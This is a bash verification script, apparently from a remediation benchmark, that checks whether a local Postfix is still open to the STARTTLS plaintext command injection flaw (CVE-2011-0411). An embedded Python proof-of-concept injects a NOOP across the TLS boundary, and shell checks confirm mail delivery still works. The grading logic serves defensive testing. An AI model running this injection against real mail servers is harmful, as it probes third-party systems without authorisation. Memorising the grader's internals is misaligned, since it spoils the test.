#!/bin/bash
# Scenario 22: Postfix STARTTLS plaintext command injection (CVE-2011-0411)
#
# BEHAVIOURAL verifier. It does NOT grep main.cf or the Postfix version — a
# defender who edits main.cf but never runs `postfix reload` is still exposed
# (the warm smtpd keeps its cached STARTTLS-enabled config; see the Dockerfile's
# oversized max_idle, which keeps that child alive well past any harness run so
# the notrestart case cannot silently invert). Instead it drives a REAL exploit
# against the running smtpd:
#
#   1. EHLO the live server. If STARTTLS is not advertised, TLS is disabled —
#      the injection is impossible and the vuln is remediated (threat.md
#      option 2). We DO NOT stop there: a "fix" that turns TLS off but also
#      bricks mail delivery must fail, so we prove the legitimate mail path
#      still works (a real MAIL FROM / RCPT TO transaction returns 250).
#   2. If STARTTLS IS advertised, pipeline "STARTTLS\r\nNOOP\r\n" in a single
#      write (the injected NOOP arrives as plaintext BEFORE the TLS handshake),
#      complete the TLS handshake, then read from the encrypted channel WITHOUT
#      sending anything. A vulnerable Postfix (<2.5.13) executes the buffered
#      plaintext NOOP inside the TLS session and replies "250 ... Ok" over TLS —
#      proof the plaintext command was injected across the TLS boundary. A fixed
#      Postfix discards the pre-TLS buffer (nothing to read).
#
# PoC checks:        the STARTTLS plaintext-injection does not fire (RC 0 = safe)
# Regression checks: Postfix master runs; the live SMTP/STARTTLS probe completes
#                    (not SMTP_DOWN / ambiguous); and the legitimate mail path
#                    (MAIL FROM / RCPT TO -> 250) still delivers
#
# Exit 0 = every check passed, Exit 1 = at least one failed, Exit 42 = N/A.
#
# Two-component protocol: every check is recorded with its kind and NOTHING
# aborts early. See lib/verifylib.sh.
#
# UNREACHABILITY: the exploit's safe/vulnerable verdict (RC 0/1) is only produced
# when the daemon answered. If the probe reports SMTP_DOWN (RC 3) or an ambiguous
# STARTTLS state (RC 4), the PoC is left UNRECORDED and the failure is recorded
# on the regression side — so a killed Postfix cannot read as "injection closed".
# The always-on mail-path check is the liveness witness.

set -u

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

POC=/tmp/starttls_inject.$$.py
trap 'rm -f "$POC"' EXIT

###############################################################################
# Regression: the image CMD boots the Postfix master (see .preserve-cmd).
# verify.sh must NEVER start it — a freshly started daemon would mask the
# "edited main.cf but never reloaded" case, and a dead service is a real failure.
###############################################################################
if pgrep -x master >/dev/null 2>&1; then
    record_reg postfix_master_running 1
else
    record_reg postfix_master_running 0 "Postfix master is not running (verify.sh must not start it)"
fi

cat > "$POC" <<'PY'
import socket, time, select, sys
from OpenSSL import SSL

HOST, PORT = "127.0.0.1", 25

def tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5); s.connect((HOST, PORT)); return s

def readline(sock, t=5):
    sock.settimeout(t); data = ""
    try:
        while not data.endswith("\n"):
            c = sock.recv(1)
            if not c: break
            data += c
    except Exception:
        pass
    return data

# Bounded wait for the SMTP banner (service may still be booting).
banner = ""
for _ in range(20):
    try:
        s = tcp()
        banner = readline(s)
        if banner.startswith("220"):
            break
    except Exception:
        banner = ""
    time.sleep(1)
if not banner.startswith("220"):
    print("SMTP_DOWN: no 220 banner on port 25")
    sys.exit(3)

# EHLO -> collect advertised capabilities.
s.sendall("EHLO probe\r\n")
time.sleep(0.3); s.settimeout(4); caps = ""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        caps += d
        if "\n250 " in ("\n" + caps):
            break
except Exception:
    pass
if "250" not in caps:
    print("SMTP_DOWN: EHLO not answered (got %r)" % caps)
    sys.exit(3)

if "STARTTLS" not in caps.upper():
    # TLS disabled -> STARTTLS injection is impossible; the mail-path regression
    # (below, in the shell) still has to prove the service is not bricked.
    print("REMEDIATED_NOTLS: STARTTLS not advertised.")
    sys.exit(0)

# STARTTLS advertised -> attempt the plaintext injection across the TLS boundary.
s.sendall("STARTTLS\r\nNOOP\r\n")          # NOOP is injected as pre-TLS plaintext
resp = readline(s)
if not resp.startswith("220"):
    print("AMBIGUOUS: STARTTLS advertised but did not return 220 (got %r)" % resp)
    sys.exit(4)

s.setblocking(1)
ctx = SSL.Context(SSL.SSLv23_METHOD)
conn = SSL.Connection(ctx, s)
conn.set_connect_state()
deadline = time.time() + 10
while True:
    try:
        conn.do_handshake(); break
    except SSL.WantReadError:
        if time.time() > deadline:
            print("AMBIGUOUS: TLS handshake did not complete")
            sys.exit(4)
        select.select([s], [], [], 2)

# Read from the encrypted channel WITHOUT sending anything. Any reply here is a
# response to the plaintext NOOP that was buffered before the handshake.
injected = ""
end = time.time() + 4
while time.time() < end:
    r, _, _ = select.select([s], [], [], 1)
    if not r:
        continue
    try:
        chunk = conn.recv(1024)
        if not chunk: break
        injected += chunk
    except SSL.WantReadError:
        continue
    except Exception:
        break

if "250" in injected:
    print("VULNERABLE: plaintext NOOP injected before STARTTLS was executed "
          "inside the TLS session (server replied %r over TLS)." % injected.strip())
    sys.exit(1)

print("REMEDIATED_TLS_SAFE: STARTTLS offered but the pre-TLS plaintext buffer "
      "was discarded (no injected reply over TLS).")
sys.exit(0)
PY

OUT=$(python "$POC" 2>&1)
RC=$?
echo "$OUT"

case "$RC" in
    0)
        record_poc starttls_injection_closed 1
        ;;
    1)
        record_poc starttls_injection_closed 0 \
            "Postfix STARTTLS plaintext command injection succeeded against the live daemon on port 25"
        ;;
    3)
        echo "  [SKIP] (poc) starttls_injection_closed: the SMTP service did not answer"
        echo "         (SMTP_DOWN), so the injection could not be exercised. Left unrecorded"
        echo "         so that killing the service cannot read as closing the vulnerability."
        record_reg smtp_service_reachable 0 "live SMTP service did not answer (rc=$RC): $OUT"
        ;;
    *)
        echo "  [SKIP] (poc) starttls_injection_closed: the STARTTLS probe was ambiguous"
        echo "         (rc=$RC), so the injection verdict is unreliable. Left unrecorded."
        record_reg starttls_probe_completed 0 "STARTTLS probe did not complete cleanly (rc=$RC): $OUT"
        ;;
esac

###############################################################################
# Regression: the LEGITIMATE mail path must still work. Drive a real envelope
# (MAIL FROM / RCPT TO to a local recipient) and require Postfix to accept it
# with 250 responses. This is the always-on liveness witness — it fails when the
# daemon is killed regardless of which PoC branch was taken.
###############################################################################
TX=$(printf 'EHLO probe\r\nMAIL FROM:<postmaster@localhost>\r\nRCPT TO:<root@localhost>\r\nQUIT\r\n' \
        | timeout 15 nc -w6 127.0.0.1 25 2>/dev/null) || true
# Postfix accepts MAIL FROM with "250 2.1.0" and RCPT TO with "250 2.1.5" (RFC
# 3463 enhanced status codes, on by default). Both must be present: a fix that
# turns TLS off but rejects recipients (bricks delivery) is missing "2.1.5".
if printf '%s\n' "$TX" | grep -q '250 2\.1\.0' && printf '%s\n' "$TX" | grep -q '250 2\.1\.5'; then
    record_reg legitimate_mail_path 1
else
    record_reg legitimate_mail_path 0 \
        "legitimate mail transaction was not accepted (MAIL FROM 250 2.1.0 and RCPT TO 250 2.1.5 required); transcript: $(printf '%s' "$TX" | tr '\r\n' '  ')"
fi

verify_finish
